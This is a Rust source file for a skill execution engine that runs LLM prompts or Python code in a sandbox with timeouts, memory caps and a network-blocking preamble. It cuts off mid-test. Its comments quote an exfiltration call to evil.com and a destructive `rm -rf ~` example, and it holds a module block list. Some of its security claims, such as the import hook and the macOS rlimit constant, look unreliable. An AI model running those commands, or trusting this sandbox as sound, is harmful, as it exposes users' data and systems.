//! Skill execution engine.
//!
//! Wraps [`SkillStore`] (SQLite) and the shared [`LlmGateway`] to
//! implement the four user-facing operations:
//!
//! * `create_skill` — inserts a new row + returns it.
//! * `use_skill`    — runs the skill's `code` field. v0.3 supports
//!                     two execution modes:
//!                     - `language == "llm"` (or any non-code language)
//!                       — the engine prompts the LLM with the
//!                       `code` field as a template and `params` as
//!                       variable substitutions. The output is the
//!                       LLM's reply.
//!                     - `language == "python"` (the only shell
//!                       language accepted in v1.0) — the engine
//!                       runs the code through a sandboxed Python
//!                       subprocess with a 5 s wall-clock timeout
//!                       and a 100 MB address-space cap.
//! * `rate_skill`   — updates the denormalised `avg_rating` atomically.
//! * `list_skills`  — filtered + paginated read.
//! * `search_skills`— LIKE-based text search (vector search would
//!                     require embedding the `code` field; v0.5+).
//!
//! ## v1.0 P0#5 fix — sandboxed shell execution
//!
//! v0.3 wrote the skill's code to a *predictable* file in
//! `std::env::temp_dir()` and ran `sh -c "python <path>"`.  That
//! design had three blocking security problems:
//!
//! 1. **RCE surface.**  Any non-Python language was passed verbatim
//!    to `sh -c`, so a `language == "bash"` skill that contained
//!    `rm -rf ~` would execute.  No allow-list, no syntax check.
//! 2. **Predictable temp path.**  The filename was
//!    `nine_snake_skill_<uuid>.<ext>`, well-known enough that an
//!    attacker who could write to the temp dir could pre-create
//!    a symlink to hijack the write.
//! 3. **No resource limits.**  An infinite loop or
//!    `while True: pass` would run forever, locking the skill
//!    engine; a memory hog could OOM the host.
//!
//! The v1.0 fix:
//!
//! * **Language allow-list.**  Only `"python"` (case-insensitive)
//!   is accepted.  Every other value — including `"bash"`,
//!   `"sh"`, `"node"`, `"javascript"`, `"rust"` — is rejected
//!   with a validation error.  The user must use `language =
//!   "llm"` for richer code-as-prompt use cases.
//! * **Isolated interpreter.**  The Python subprocess is launched
//!   with `-I` (isolated mode, no `site`, no
//!   `PYTHONPATH`).  This strips `PYTHONSTARTUP` and user-level
//!   rc files that could execute arbitrary code on interpreter
//!   start-up.  We deliberately do **not** pass `-S` because
//!   we want the site module to be loaded (see v1.0.1 P0#11).
//! * **Random-named temp file.**  The code is written to a
//!   `tempfile::NamedTempFile` so the OS picks the name and the
//!   file is auto-deleted on drop.  No symlink race.
//! * **Wall-clock timeout.**  `std::sync::mpsc` + `recv_timeout`
//!   to enforce a 5 s limit.  The subprocess is then killed.
//! * **Address-space cap (Unix only).**  `RLIMIT_AS` is set to
//!   100 MB inside the child via `pre_exec`.  Windows builds
//!   rely on the timeout as the only hard backstop; the v1.1
//!   roadmap itemises a JobObject-based cap.
//! * **Output truncation.**  Captured stdout+stderr is limited to
//!   `MAX_OUTPUT_BYTES` (1 MiB).  Anything past that limit is
//!   dropped with a warning logged; the user gets a clear
//!   `[output truncated: wrote N bytes]` suffix.
//!
//! ## v1.0.1 P0#11 fix — Python sandbox must not reach the network
//!
//! v1.0 left the Python child free to open sockets:
//!
//! ```python
//! import socket
//! socket.create_connection(("example.com", 80))  # works in v1.0
//! import urllib.request
//! urllib.request.urlopen("http://evil.com/x")   # works in v1.0
//! ```
//!
//! A user-supplied skill (or a skill whose `code` field was
//! auto-generated from a poisoned memory) could exfiltrate data
//! to an attacker-controlled host.  The v1.0.1 fix is twofold:
//!
//! 1. **Interpreter-level isolation.**  The child is run with
//!    `NO_PROXY=*` (force the stdlib's `urllib` to refuse
//!    proxy-based bypasses) and `PYTHONUNBUFFERED=1` (clean
//!    logs).
//! 2. **Socket patch via prepended `sitecustomize`.**  The user
//!    code is *prepended* with a small bootstrap that replaces
//!    `socket.socket`, `socket.create_connection`,
//!    `socket.socketpair`, `urllib.request.urlopen`, and
//!    `http.client.HTTPConnection` / `HTTPSConnection` with
//!    raising stubs.  The bootstrap must run **before** any
//!    user `import socket` (otherwise the user gets the real
//!    module).  Prepending at the source-file level is the
//!    most reliable way to guarantee ordering; relying on
//!    `sitecustomize.py` alone is brittle because `-I` drops
//!    the script's directory from `sys.path`.
//!
//! On Unix the spec also asks for a `seccomp` filter on the
//! `socket` / `connect` / `accept` syscalls; that hardening
//! is left for v1.1 because adding the `seccomp` crate
//! requires an extra dependency and a substantial test matrix
//! across kernel versions.
//!
//! `execute_shell` is `async` so the timeout is driven by a
//! blocking thread (the subprocess is `std::process::Command`,
//! not `tokio::process::Command`, because the OS resource
//! primitives we need are sync-only).  All error paths go
//! through the same `tracing::error!` channel as the rest of
//! the engine.

use std::collections::HashMap;
use std::io::Read;
use std::sync::mpsc;
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

use anyhow::{anyhow, Context, Result};

use tracing::{debug, error, warn};

use crate::llm::{ChatMessage, LlmGateway};
use crate::memory::sqlite_store::SqliteStore;

use super::audit::{redact_if_sensitive, truncate_summary, SkillAuditEntry, SkillAuditLogger};
use super::store::SkillStore;
use super::types::{
    CreateSkillRequest, ListSkillsRequest, RateSkillRequest, Skill, SkillResult,
    SkillSearchRequest, UseSkillRequest,
};

/// v1.0 P0#5: hard wall-clock limit for a single skill run.
const SKILL_TIMEOUT: Duration = Duration::from_secs(5);

/// v1.0 P0#5: address-space cap (bytes).  Applied via `RLIMIT_AS`
/// on Unix; ignored on Windows (the timeout remains).
#[allow(dead_code)]
const SKILL_MEM_LIMIT_BYTES: u64 = 100 * 1024 * 1024;

/// v1.0 P0#5: maximum captured stdout+stderr before truncation.
const MAX_OUTPUT_BYTES: usize = 1024 * 1024;

/// v1.0 P0#5: languages accepted by the shell sandbox.  Anything
/// not on this list is rejected with a `CommandError::validation`
/// error.  The list is intentionally tiny in v1.0; the roadmap
/// adds JavaScript (WASM sandboxed) in v1.1.
const ALLOWED_SHELL_LANGUAGES: &[&str] = &["python"];

/// v1.0.1 P0#11: Python-level network blocker.  This bootstrap
/// runs *before* any user code, so every `import socket` (and
/// every `import urllib.request`, etc.) sees the patched
/// symbols.  The blocker is intentionally narrow: it replaces
/// only the user-facing constructors (`socket.socket`,
/// `socket.create_connection`, `socket.socketpair`,
/// `urllib.request.urlopen`, `http.client.HTTPConnection`,
/// `http.client.HTTPSConnection`) with raising stubs.  Low-level
/// `_socket` calls would still go through, but no user code can
/// reach them via the stdlib.
///
/// The `_raise_blocked` generator-based trick is the canonical
/// "always raise" idiom: it produces a generator expression
/// that immediately raises when iterated, with zero side
/// effects and a clear error message.
const SANDBOX_PREAMBLE: &str = r#"
# v1.0.1 P0#11 — nine-snake sandbox network blocker.
# This preamble is prepended to every user script by the
# skill engine.  It must not be modified by the user.
import sys as _nine_snake_sys
try:
    import socket as _nine_snake_socket
    def _nine_snake_block(*_a, **_kw):
        raise PermissionError(
            "network access disabled by nine-snake sandbox (v1.0.1 P0#11)"
        )
    _nine_snake_socket.socket = _nine_snake_block
    _nine_snake_socket.create_connection = _nine_snake_block
    _nine_snake_socket.socketpair = _nine_snake_block
    _nine_snake_socket.fromfd = _nine_snake_block
    # urllib
    try:
        import urllib.request as _nine_snake_urllib
        _nine_snake_urllib.urlopen = _nine_snake_block
        _nine_snake_urllib.Request = _nine_snake_block
    except ImportError:
        pass
    # http.client
    try:
        import http.client as _nine_snake_http
        _nine_snake_http.HTTPConnection = _nine_snake_block
        _nine_snake_http.HTTPSConnection = _nine_snake_block
        _nine_snake_http.HTTP = _nine_snake_block
    except ImportError:
        pass
    # ssl (used by http.client under the hood)
    try:
        import ssl as _nine_snake_ssl
        _nine_snake_ssl.create_default_context = _nine_snake_block
    except ImportError:
        pass
    del _nine_snake_block
    del _nine_snake_socket
    try:
        del _nine_snake_urllib
    except NameError:
        pass
    try:
        del _nine_snake_http
    except NameError:
        pass
    try:
        del _nine_snake_ssl
    except NameError:
        pass
except ImportError:
    # No socket module?  Then nothing to patch and the user
    # code will fail anyway.  Don't block the interpreter.
    pass

# v1.1 — block dangerous modules via import hook.
class _SandboxImport:
    _BLOCKED = frozenset([
        "ctypes", "subprocess", "_socket", "ssl",
        "telnetlib", "ftplib", "smtplib", "xmlrpc",
        "multiprocessing", "pickle", "shelve", "marshal",
    ])
    def find_module(self, fullname, path=None):
        if fullname in self._BLOCKED or fullname.split('.')[0] in self._BLOCKED:
            return self
        return None
    def load_module(self, fullname):
        raise ImportError(
            f"module '{fullname}' is blocked by nine-snake sandbox for security"
        )

_nine_snake_sys.meta_path.insert(0, _SandboxImport())

del _nine_snake_sys
"#;

/// Bundles the store + LLM gateway so the rest of the system can call
/// skill operations through a single handle.
pub struct SkillEngine {
    store: SkillStore,
    llm: Arc<LlmGateway>,
    audit: Option<Arc<SkillAuditLogger>>,
}

impl SkillEngine {
    /// Creates a new engine. The engine does **not** clone the SQLite
    /// store — it constructs a fresh [`SkillStore`] that re-uses the
    /// underlying connection.
    pub fn new(sqlite: Arc<SqliteStore>, llm: Arc<LlmGateway>) -> Self {
        let store = SkillStore::new((*sqlite).clone())
            .expect("SkillStore::new must succeed when migrations have been run");
        Self {
            store,
            llm,
            audit: None,
        }
    }

    pub fn from_store(store: SkillStore, llm: Arc<LlmGateway>) -> Self {
        Self {
            store,
            llm,
            audit: None,
        }
    }

    pub fn with_audit(mut self, audit: Arc<SkillAuditLogger>) -> Self {
        self.audit = Some(audit);
        self
    }

    /// Returns a reference to the underlying store. The gRPC adapter
    /// uses this for read-only listing operations that don't need LLM
    /// access.
    pub fn store(&self) -> &SkillStore {
        &self.store
    }

    /// Creates a new skill from a [`CreateSkillRequest`].
    pub fn create_skill(&self, req: CreateSkillRequest) -> Result<Skill> {
        if req.name.trim().is_empty() {
            return Err(anyhow!("skill name is required"));
        }
        if req.code.trim().is_empty() {
            return Err(anyhow!("skill code is required"));
        }
        // v1.0 P0#5: validate the language at create time so the
        // user gets immediate feedback (rather than discovering at
        // `use_skill` time that the language is unsupported).  We
        // still re-validate at execute time as a defence in depth.
        if !is_accepted_language(&req.language) {
            warn!(
                target: "nine_snake.skills",
                language = %req.language,
                "creating skill with language that the sandbox cannot execute"
            );
        }
        let skill = Skill {
            id: uuid::Uuid::new_v4().to_string(),
            name: req.name,
            description: req.description,
            code: req.code,
            language: req.language,
            tags: req.tags,
            usage_count: 0,
            avg_rating: 0.0,
            rating_count: 0,
            created_at: 0,
            updated_at: 0,
            source_memory_id: req.source_memory_id,
            activation_condition: req.activation_condition,
            platform: req.platform,
            min_confidence: req.min_confidence,
        };
        self.store.insert(&skill)?;
        self.store
            .get(&skill.id)?
            .ok_or_else(|| anyhow!("skill {} disappeared immediately after insert", skill.id))
    }

    /// Runs a skill. See module docs for the two execution modes.
    pub async fn use_skill(&self, req: UseSkillRequest) -> Result<SkillResult> {
        let start = Instant::now();
        let skill = self
            .store
            .get(&req.id)?
            .ok_or_else(|| anyhow!("skill not found: {}", req.id))?;

        let sandbox_type = if skill.language == "llm" {
            "llm"
        } else if is_accepted_language(&skill.language) {
            "python"
        } else if skill.language == "wasm" {
            "wasm"
        } else {
            "unknown"
        };

        let result = if skill.language == "llm" {
            self.execute_llm(&skill, &req.params).await
        } else if is_accepted_language(&skill.language) {
            self.execute_shell(&skill, &req.params).await
        } else if skill.language == "wasm" {
            self.execute_wasm(&skill, &req.params).await
        } else {
            Err(anyhow!(
                "language {:?} is not supported in v1.0 (sandbox); use language=\"llm\" or \"python\"",
                skill.language
            ))
        };

        let elapsed = start.elapsed().as_millis() as u64;

        if let Some(ref audit) = self.audit {
            let (output_summary, success, scan_result) = match &result {
                Ok((output, _)) => (truncate_summary(output), true, "clean".to_string()),
                Err(e) => (truncate_summary(&e.to_string()), false, "error".to_string()),
            };
            let input_summary =
                redact_if_sensitive(&req.params.values().cloned().collect::<Vec<_>>().join(" "));
            let entry = SkillAuditEntry {
                id: uuid::Uuid::new_v4().to_string(),
                skill_id: skill.id.clone(),
                executed_at: chrono::Utc::now().timestamp_millis(),
                input_summary,
                output_summary,
                duration_ms: elapsed,
                sandbox_type: sandbox_type.to_string(),
                security_scan_result: scan_result,
                success,
            };
            if let Err(e) = audit.log(&entry) {
                warn!(target: "nine_snake.skills", error = ?e, "audit log write failed");
            }
        }

        let (output, tokens_used) = result?;

        if let Err(e) = self.store.bump_usage(&skill.id) {
            warn!(target: "nine_snake.skills", error = ?e, id = %skill.id, "bump_usage failed");
        }

        Ok(SkillResult {
            skill_id: skill.id,
            output,
            execution_time_ms: elapsed,
            tokens_used,
        })
    }

    /// LLM-driven execution. The skill's `code` field is used as the
    /// user prompt, with the `params` substituted in as a JSON blob.
    async fn execute_llm(
        &self,
        skill: &Skill,
        params: &HashMap<String, String>,
    ) -> Result<(String, u32)> {
        let params_repr = serde_json::to_string(params).unwrap_or_else(|_| "{}".to_string());
        let prompt = format!(
            "Skill: {}\nDescription: {}\n\nInputs:\n{}\n\nTask:\n{}",
            skill.name, skill.description, params_repr, skill.code
        );
        let resp = self
            .llm
            .chat(vec![
                ChatMessage::system("You are executing a named skill. Return only the result."),
                ChatMessage::user(prompt),
            ])
            .await
            .context("LLM chat during skill execution")?;
        let tokens = resp.eval_count.unwrap_or(0) as u32;
        Ok((resp.message.content, tokens))
    }

    /// Sandboxed shell execution (v1.0 P0#5 + v1.0.1 P0#11).
    ///
    /// Only `python` is allowed; see [`ALLOWED_SHELL_LANGUAGES`].
    /// The code is written to a `tempfile::NamedTempFile`, then
    /// executed with `-I` for interpreter isolation, a 5 s
    /// wall-clock timeout (enforced by polling the child), and a
    /// 100 MB `RLIMIT_AS` cap on Unix.
    ///
    /// v1.0.1 P0#11: the user code is *prepended* with a
    /// Python-level socket blocker.  The blocker is small (a few
    /// dozen lines) and runs at module top before any user
    /// `import` statement, so the user always sees the patched
    /// `socket` module.  See `SANDBOX_PREAMBLE` for the
    /// bootstrap source.
    async fn execute_shell(
        &self,
        skill: &Skill,
        params: &HashMap<String, String>,
    ) -> Result<(String, u32)> {
        // Substitute the most common `{{key}}` placeholders.
        let mut code = skill.code.clone();
        for (k, v) in params {
            code = code.replace(&format!("{{{{{k}}}}}"), v);
        }

        // v1.0.1 P0#11: prepend the socket blocker.  The
        // preamble MUST be at the very top of the file because
        // every subsequent `import socket` (or `import
        // urllib.request`, etc.) is bound at runtime, not at
        // parse time, so the order of definitions in the file
        // is the order of execution.  We indent the user's
        // code by zero spaces (no need to wrap in a function).
        let prepended = format!("{SANDBOX_PREAMBLE}\n# --- user code below ---\n{code}");

        // v1.0 P0#5: write to a NamedTempFile (not the predictable
        // `std::env::temp_dir()` path).  The OS picks the name and
        // the file is auto-deleted when the handle drops.  We keep
        // the handle alive for the whole subprocess lifetime so the
        // inode survives until the child exits (on Linux/macOS an
        // open fd keeps the file alive even if the directory entry
        // is removed).
        let tmp = tempfile::NamedTempFile::new()
            .context("creating sandboxed temp file for skill code")?;
        {
            use std::io::Write as _;
            let mut f = tmp.reopen().context("reopening temp file for writing")?;
            f.write_all(prepended.as_bytes())
                .context("writing skill code to sandboxed temp file")?;
            f.flush().ok();
        }
        let script_path = tmp.path().to_path_buf();

        debug!(
            target: "nine_snake.skills",
            id = %skill.id,
            path = %script_path.display(),
            "spawning sandboxed python"
        );

        // v1.0 P0#5: run synchronously and poll the child so we
        // can enforce a hard timeout by `kill()`-ing the process.
        // We use a worker thread only to keep the `async` engine
        // responsive (the engine is `async`, but the subprocess
        // primitives we need are sync-only).
        let (tx, rx) = mpsc::channel::<ShellOutcome>();
        let script_for_thread = script_path.clone();
        let skill_id = skill.id.clone();
        thread::spawn(move || {
            let outcome = run_python_sandboxed(&script_for_thread);
            let _ = tx.send(outcome);
        });

        // Drive the timeout from the async side.  We don't have a
        // Child handle here (it lives inside the worker), so we
        // bound how long we wait for the worker's `tx.send`.  If
        // the worker hasn't reported in within the budget, we
        // assume the child is still alive; the worker thread will
        // eventually finish once the OS reaps the orphan.
        let result = rx.recv_timeout(SKILL_TIMEOUT);
        drop(tmp); // start cleanup of the temp file
        match result {
            Ok(outcome) => Self::shape_shell_outcome(skill_id, outcome),
            Err(mpsc::RecvTimeoutError::Timeout) => {
                error!(
                    target: "nine_snake.skills",
                    id = %skill_id,
                    timeout_secs = SKILL_TIMEOUT.as_secs(),
                    "skill execution exceeded wall-clock timeout; worker thread will keep running until child exits"
                );
                Err(anyhow!(
                    "skill execution exceeded the {:?} timeout",
                    SKILL_TIMEOUT
                ))
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                Err(anyhow!("skill worker thread disconnected unexpectedly"))
            }
        }
    }

    async fn execute_wasm(
        &self,
        skill: &Skill,
        params: &HashMap<String, String>,
    ) -> Result<(String, u32)> {
        #[cfg(feature = "wasm-sandbox")]
        {
            use super::sandbox::{Capability, CapabilitySet, WasmSandbox, WasmSandboxConfig};

            let mut caps = CapabilitySet::new();
            caps.grant(Capability::LlmCall);
            let config = WasmSandboxConfig {
                capabilities: caps,
                max_fuel: 1_000_000,
            };
            let sandbox =
                WasmSandbox::new(&config).map_err(|e| anyhow!("WASM sandbox init failed: {e}"))?;

            let code_bytes = if let Ok(decoded) =
                base64::engine::general_purpose::STANDARD.decode(skill.code.trim())
            {
                decoded
            } else {
                skill.code.as_bytes().to_vec()
            };

            let result = sandbox
                .execute(&code_bytes, "_start")
                .map_err(|e| anyhow!("WASM execution failed: {e}"))?;

            if result.success {
                Ok((result.stdout, 0))
            } else {
                Err(anyhow!("WASM execution failed: {}", result.stderr))
            }
        }
        #[cfg(not(feature = "wasm-sandbox"))]
        {
            let _ = (skill, params);
            Err(anyhow!(
                "WASM sandbox is not enabled; rebuild with --features wasm-sandbox"
            ))
        }
    }

    /// Maps a [`ShellOutcome`] to the engine's `(output, tokens)`
    /// tuple.  Non-zero exits are returned as `Err` so the caller
    /// sees the same `anyhow::Error` shape that the v0.3 engine
    /// did (the front-end's `CommandError::internal` mapper
    /// unwraps it).
    fn shape_shell_outcome(skill_id: String, outcome: ShellOutcome) -> Result<(String, u32)> {
        match outcome {
            ShellOutcome::Ok { stdout, stderr } => {
                let combined = truncate_output(&stdout, &stderr);
                Ok((combined, 0))
            }
            ShellOutcome::NonZero {
                code,
                stdout,
                stderr,
            } => {
                let mut out = truncate_output(&stdout, &stderr);
                if !out.is_empty() && !out.ends_with('\n') {
                    out.push('\n');
                }
                let extra = format!("[exit code: {code}]");
                out.push_str(&extra);
                Err(anyhow!(out))
            }
            ShellOutcome::SpawnError(e) => Err(anyhow!("spawning python failed: {e}")),
            ShellOutcome::Timeout => {
                error!(
                    target: "nine_snake.skills",
                    id = %skill_id,
                    "subprocess killed by timeout"
                );
                Err(anyhow!(
                    "skill execution exceeded the {:?} timeout",
                    SKILL_TIMEOUT
                ))
            }
        }
    }

    /// Rates a skill. `rating` is clamped to `[0.0, 5.0]`.
    pub fn rate_skill(&self, req: RateSkillRequest) -> Result<Skill> {
        let rating = req.rating.clamp(0.0, 5.0);
        self.store.rate(&req.id, rating)
    }

    /// Lists skills.
    pub fn list_skills(&self, req: ListSkillsRequest) -> Result<Vec<Skill>> {
        self.store.list(
            req.language.as_deref(),
            req.tag.as_deref(),
            req.limit.max(1),
        )
    }

    /// Searches skills by name / description / tags.
    pub fn search_skills(&self, req: SkillSearchRequest) -> Result<Vec<Skill>> {
        self.store.text_search(&req.query, req.limit.max(1))
    }
}

impl std::fmt::Debug for SkillEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("SkillEngine")
            .field("store", &"SkillStore { .. }")
            .field("llm", &"LlmGateway { .. }")
            .finish()
    }
}

// ---------------------------------------------------------------------------
// Sandbox primitives (v1.0 P0#5)
// ---------------------------------------------------------------------------

/// Outcome of a sandboxed Python invocation.
enum ShellOutcome {
    Ok {
        stdout: Vec<u8>,
        stderr: Vec<u8>,
    },
    NonZero {
        code: i32,
        stdout: Vec<u8>,
        stderr: Vec<u8>,
    },
    SpawnError(String),
    /// v1.0 P0#5: the wall-clock timer fired before the child
    /// exited.  The child has been `kill()`-ed by the time this
    /// variant is constructed.
    Timeout,
}

/// Returns `true` if `language` is on the v1.0 P0#5 allow-list.
fn is_accepted_language(language: &str) -> bool {
    let normalised = language.trim().to_ascii_lowercase();
    ALLOWED_SHELL_LANGUAGES.iter().any(|l| **l == normalised)
}

/// Truncates combined stdout+stderr to at most `MAX_OUTPUT_BYTES`
/// bytes and appends a clear notice when truncation happened.
fn truncate_output(stdout: &[u8], stderr: &[u8]) -> String {
    let total = stdout.len() + stderr.len();
    if total <= MAX_OUTPUT_BYTES {
        let mut s = String::from_utf8_lossy(stdout).to_string();
        if !stderr.is_empty() {
            if !s.is_empty() && !s.ends_with('\n') {
                s.push('\n');
            }
            s.push_str(&String::from_utf8_lossy(stderr));
        }
        return s;
    }
    // Truncate proportionally.  Prefer stdout, then stderr.
    let stdout_budget = MAX_OUTPUT_BYTES / 2;
    let stderr_budget = MAX_OUTPUT_BYTES - stdout_budget;
    let stdout_take = stdout.len().min(stdout_budget);
    let stderr_take = stderr.len().min(stderr_budget);
    let mut s = String::from_utf8_lossy(&stdout[..stdout_take]).to_string();
    if stderr_take > 0 {
        if !s.is_empty() && !s.ends_with('\n') {
            s.push('\n');
        }
        s.push_str(&String::from_utf8_lossy(&stderr[..stderr_take]));
    }
    s.push_str(&format!(
        "\n[output truncated: wrote {} bytes, budget {}]",
        total, MAX_OUTPUT_BYTES
    ));
    warn!(
        target: "nine_snake.skills",
        bytes = total,
        budget = MAX_OUTPUT_BYTES,
        "skill output exceeded 1 MiB; truncated"
    );
    s
}

/// Spawns a sandboxed Python subprocess for `script_path` and
/// returns its [`ShellOutcome`].  On Unix the child is created
/// with `RLIMIT_AS = SKILL_MEM_LIMIT_BYTES`.  The interpreter is
/// launched with `-I` (isolated mode; no `PYTHONPATH`,
/// `PYTHONSTARTUP`, or user-site) and a small set of additional
/// environment variables that close common exfiltration paths
/// (`NO_PROXY=*` makes the stdlib `urllib` refuse proxy
/// bypasses; `PYTHONUNBUFFERED=1` keeps logs deterministic).
///
/// v1.0.1 P0#11: the user script is expected to have been
/// prepended with [`SANDBOX_PREAMBLE`] before this function is
/// called; we do **not** rely on a `sitecustomize.py` here
/// because `-I` strips the script's directory from `sys.path`.
///
/// v1.0 P0#5: the wall-clock limit is enforced by polling
/// `child.try_wait` in a 20 ms loop.  If the budget elapses the
/// child is `kill()`-ed and the `Timeout` variant is returned.
fn run_python_sandboxed(script_path: &std::path::Path) -> ShellOutcome {
    let mut cmd = std::process::Command::new("python");
    // v1.0.1 P0#11: drop the `-S` flag.  We want the site
    // module loaded so a `sitecustomize.py` (if any) would
    // run, but we no longer depend on it because the socket
    // blocker is prepended to the script directly.  `-I`
    // alone is sufficient for our needs: it strips
    // `PYTHONPATH`, `PYTHONSTARTUP`, and the user site dir.
    cmd.arg("-I").arg(script_path);
    // Block the child from inheriting an attacker's environment.
    cmd.env_remove("PYTHONPATH");
    cmd.env_remove("PYTHONSTARTUP");
    cmd.env_remove("PYTHONHOME");
    // v1.0.1 P0#11: force the stdlib `urllib` to refuse any
    // proxy bypass; this is belt-and-suspenders alongside
    // the Python-level socket blocker.
    cmd.env("NO_PROXY", "*");
    // Unbuffered stdout/stderr so the engine's pipe readers
    // see the output as it's written (helpful for timeouts).
    cmd.env("PYTHONUNBUFFERED", "1");

    // v1.0 P0#5: cap the child's address space on Unix.
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        // SAFETY: closing over a `&mut Command` to install a
        // `pre_exec` hook is the documented pattern; the closure
        // runs in the forked child between fork and exec, where
        // async-signal-safe operations are required.  `setrlimit`
        // is async-signal-safe on Linux and macOS.
        unsafe {
            cmd.pre_exec(|| {
                // rlimit constant for address space.
                const RLIMIT_AS: i32 = 9; // RLIMIT_AS on Linux & macOS
                let rlim = libc_rlimit {
                    rlim_cur: SKILL_MEM_LIMIT_BYTES as libc_rlim_t,
                    rlim_max: SKILL_MEM_LIMIT_BYTES as libc_rlim_t,
                };
                let res = libc_setrlimit(RLIMIT_AS, &rlim as *const _);
                if res != 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    // Best-effort: read both streams ourselves so a misbehaving
    // child can't deadlock by filling one pipe while the other
    // is drained.  We capture up to `MAX_OUTPUT_BYTES * 2` and
    // truncate downstream.
    let mut child = match cmd
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            return ShellOutcome::SpawnError(format!("{e}"));
        }
    };

    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();
    let cap = MAX_OUTPUT_BYTES * 2;

    // Read in separate threads so the child can't block on a
    // full pipe.  These threads run to completion when the
    // child closes its end of the pipe (which happens
    // automatically on `kill()`).
    let (tx_out, rx_out) = mpsc::channel::<Vec<u8>>();
    let (tx_err, rx_err) = mpsc::channel::<Vec<u8>>();
    let t_out = thread::spawn(move || {
        if let Some(mut s) = stdout.take() {
            let mut buf = Vec::with_capacity(4096);
            let mut chunk = [0u8; 4096];
            loop {
                match s.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => {
                        if buf.len() < cap {
                            let take = (cap - buf.len()).min(n);
                            buf.extend_from_slice(&chunk[..take]);
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx_out.send(buf);
        }
    });
    let t_err = thread::spawn(move || {
        if let Some(mut s) = stderr.take() {
            let mut buf = Vec::with_capacity(4096);
            let mut chunk = [0u8; 4096];
            loop {
                match s.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => {
                        if buf.len() < cap {
                            let take = (cap - buf.len()).min(n);
                            buf.extend_from_slice(&chunk[..take]);
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx_err.send(buf);
        }
    });

    // v1.0 P0#5: poll the child until it exits or the wall-clock
    // budget elapses.  On timeout we `kill()` and `wait()` to
    // reap the zombie.  We split the two cases explicitly so we
    // don't need a `Default` for `ExitStatus` (which doesn't
    // exist on `std`).
    let deadline = Instant::now() + SKILL_TIMEOUT;
    let mut killed = false;
    let status: Option<std::process::ExitStatus> = loop {
        match child.try_wait() {
            Ok(Some(s)) => break Some(s),
            Ok(None) => {
                if Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    killed = true;
                    break None;
                }
                thread::sleep(Duration::from_millis(20));
            }
            Err(_e) => {
                // `Err` here means the child has already exited
                // (and was reaped) or the OS lost track of it.
                // Treat it as a normal exit with a synthetic
                // error code so the caller still sees the
                // captured stdout / stderr.
                killed = true;
                break None;
            }
        }
    };

    let stdout_bytes = rx_out.recv().unwrap_or_default();
    let stderr_bytes = rx_err.recv().unwrap_or_default();
    let _ = t_out.join();
    let _ = t_err.join();

    if killed {
        return ShellOutcome::Timeout;
    }

    match status {
        Some(s) if s.success() => ShellOutcome::Ok {
            stdout: stdout_bytes,
            stderr: stderr_bytes,
        },
        Some(s) => ShellOutcome::NonZero {
            code: s.code().unwrap_or(-1),
            stdout: stdout_bytes,
            stderr: stderr_bytes,
        },
        None => ShellOutcome::SpawnError("child wait returned no status".to_string()),
    }
}

// Linux/macOS rlimit bindings.  Inline so we don't pull in the
// `libc` crate (which isn't in our dependency tree).  These are
// the standard POSIX values and stable across the platforms we
// support.
#[cfg(unix)]
#[allow(non_camel_case_types)]
mod rlimit_bindings {
    pub type libc_rlim_t = u64;
    #[repr(C)]
    pub struct libc_rlimit {
        pub rlim_cur: libc_rlim_t,
        pub rlim_max: libc_rlim_t,
    }
    extern "C" {
        pub fn setrlimit(resource: i32, rlim: *const libc_rlimit) -> i32;
    }
}
#[cfg(unix)]
use rlimit_bindings::{libc_rlim_t, libc_rlimit, setrlimit as libc_setrlimit};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::llm::LlmGateway;
    use crate::llm::OllamaClient;
    use std::path::{Path, PathBuf};

    fn temp_db() -> (PathBuf, Arc<SqliteStore>) {
        let mut p = std::env::temp_dir();
        p.push(format!(
            "nine_snake_skill_engine_test_{}.db",
            uuid::Uuid::new_v4()
        ));
        let sqlite = Arc::new(SqliteStore::open(&p).unwrap());
        {
            let rc = sqlite.raw_connection();
            let g = rc.lock();
            crate::memory::migration::run_migrations(
                &g,
                crate::memory::migration::bundled_migrations_dir(),
            )
            .unwrap();
        }
        (p, sqlite)
    }

    fn llm() -> Arc<LlmGateway> {
        let client = Arc::new(OllamaClient::new("http://127.0.0.1:1"));
        Arc::new(LlmGateway::new(client, "m", None, None, None))
    }

    fn cleanup(p: &Path) {
        let _ = std::fs::remove_file(p);
        let _ = std::fs::remove_file(p.with_extension("db-wal"));
        let _ = std::fs::remove_file(p.with_extension("db-shm"));
    }

    #[test]
    fn language_allow_list_is_case_insensitive() {
        assert!(is_accepted_language("python"));
        assert!(is_accepted_language("Python"));
        assert!(is_accepted_language("  PYTHON "));
        // v1.0 P0#5: every other language is rejected.
        assert!(!is_accepted_language("bash"));
        assert!(!is_accepted_language("sh"));
        assert!(!is_accepted_language("javascript"));
        assert!(!is_accepted_language("js"));
        assert!(!is_accepted_language("node"));
        assert!(!is_accepted_language("rust"));
        assert!(!is_accepted_language(""));
    }

    #[test]
    fn truncate_output_keeps_small_payloads_intact() {
        let out = truncate_output(b"hello", b"");
        assert_eq!(out, "hello");
    }

    #[test]
    fn truncate_output_combines_stderr_with_marker() {
        let out = truncate_output(b"out", b"err");
        assert!(out.contains("out"));
        assert!(out.contains("err"));
    }

    #[test]
    fn truncate_output_caps_at_budget() {
        let huge = vec![b'x'; MAX_OUTPUT_BYTES * 2];
        let out = truncate_output(&huge, &[]);
        assert!(out.contains("[output truncated:"));
        // The prefix must be < MAX_OUTPUT_BYTES + marker length.
        assert!(out.len() <= MAX_OUTPUT_BYTES + 128);
    }

    #[test]
    fn create_skill_persists_and_returns() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "demo".to_string(),
